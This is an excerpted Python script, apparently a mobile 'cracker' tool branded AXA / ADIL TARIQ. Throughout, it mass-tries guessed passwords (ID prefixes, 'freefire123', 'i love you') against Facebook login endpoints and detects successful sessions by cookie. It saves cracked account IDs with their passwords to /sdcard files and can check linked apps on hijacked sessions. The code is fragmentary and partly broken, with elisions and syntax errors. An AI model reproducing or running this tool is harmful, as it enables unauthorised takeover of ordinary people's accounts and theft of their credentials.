...
os.system("xdg-open https://www.facebook.com/groups/402877498707530 ")
#app  check 
...
'\33[1;97m##     ## ##     ## ##     ##\033[1;34mB
[+]==============================================
[+]  Author    : \033[1;32mADIL TARIQ
[+]  GITHUB    : adiltoor27
[+]  TOOL TYPE : FREE
[+]  FACEBOOK  : ADIL TARIQ 
[+]  VERSION   : \033[1;31m0.0.1
[+]=============================================="""
...
def cek_apk(session,coki):
    ...
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\033[1;92m[+]\033[1;97m Sorry there is no Expired Apk')
    else:
...
def file():
				...
				try:
					os.system('clear')
					print(logo)
					print('HOW MANY PASSWORD DO YOU WANT ADD')
					linex()
					ps_limit = int(input(' PUT PASSWORD : '))
				except:
					ps_limit =1
				os.system('clear')
				print(logo)
				...
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
	                                ...
	                                print(logo)
	                                print("[+]==============================================")
	                                print("[+] DO YOU WANT SHOW ACTIVE APPS ")
	                                print("[+]==============================================")
                                	axalovesyou = input("[+] [CHOOSE] :- ")
                                	if axalovesyou in ['y','Y','1','yes','YES','Yes']:
		                        axa_xd.append('y')
                                	else:
		                        axa_xd.append('n')
					os.system('clear')
					...
					print(' \x1b[1;91mIf you no result use flight mode')
                                        print(' [•]  \33[0;41mPROUD TO BE MUSLIM\33[0m')
					linex()
					for user in fo:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[AXA-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in axa_xd
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/AXA-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[AXA-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/AXA-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mAXA-NOOB\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def adil1():
	...
	os.system('clear')
	print(logo)
	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  ')
	print(47*'-')
	...
	if axalovesyou in ['y','Y','1','yes','YES','Yes']:
		...
		for guru in user:
			...
			if adil =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif adil =='2':yaari.submit(p,uid,pwx,tl)
			elif adil =='3':yaari.submit(x,uid,pwx,tl)
			elif adil =='4':yaari.submit(mobile,uid,pwx,tl)
			elif adil =='5':yaari.submit(freeq,uid,pwx,tl)
			else:
			    yaari.submit(p,uid,pwx,tl)
			
	print(47*"-")
	print('[?] Crack process has been completed')
	print('[?] Ids saved in AXA-OK.txt,AXA-CP.txt')
	print(47*"-") 
...
def adil2():
	...
	if axalovesyou in ['y','Y','1','yes','YES','Yes']:
		...
		for guru in user:
			...
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk,'baburam','janjan','kanaji','Free Fire','i love you','freefire123','kumarkumar','rohitkumar']
			if axa =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif axa =='2':yaari.submit(p,uid,pwx,tl)
			elif axa =='3':yaari.submit(x,uid,pwx,tl)
			elif axa =='4':yaari.submit(mobile,uid,pwx,tl)
			elif axa =='5':yaari.submit(freeq,uid,pwx,tl)
			else:
			    yaari.submit(p,uid,pwx,tl)
			
	print(47*"-")
	print('[?] Crack process has been completed')
	print('[?] Ids saved inAXA-OK.txt,AXA-CP.txt')
	print(47*"-")
...
def adil3():
	...
	if axalovesyou in ['y','Y','1','yes','YES','Yes']:
		...
		for guru in user:
			...
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk,'mdrakib','janjan','bangladesh','Free Fire','i love you','freefire123','kumarkumar','rohitkumar']
			if axafire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif axa=='2':yaari.submit(p,uid,pwx,tl)
			elif axa =='3':yaari.submit(x,uid,pwx,tl)
			elif axa =='4':yaari.submit(mobile,uid,pwx,tl)
			elif axa =='5':yaari.submit(freeq,uid,pwx,tl)
...
def crack(uid,pwx):
    ...
    'user-agent': ua,}
		...
		if 'c_user' in log_cookies:
			coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
			cid = coki[151:166]
			p("\r \033[1;92m??[AXA-OK] %s | %s \033[1;97m"%(cid,ps))
			open("/sdcard/AXA/OK.txt","a").write(cid+'|'+ps+'\n')
			ok.append(cid+ps)
			break
			continue
			...
			if 'Enter login code to continue' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid=coki[24:39]
				print('\r\033[1;34m[AXA-2F] '+uid+' [~] '+ps+' ')
				open("/sdcard/AXA/2F.txt","a").write(uid,ps)
				twf.append(uid)
			else:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				#p(coki)
				p("\r \033[1;93m??[AXA-CP] %s | %s \033[1;97m"%(cid,ps))
				open("/sdcard/AXA/CP.txt","a").write(cid+'|'+ps+'\n')
				cp.append(cid+ps)
				break
			...
			open("/sdcard/AXA/LOCK.txt",'a').write(cid+'|'+ps+'\n')
			twf.append(cid+ps)
			break
		else:
			continue
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-AXA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-AXA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-AXA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-AXA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-AXA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
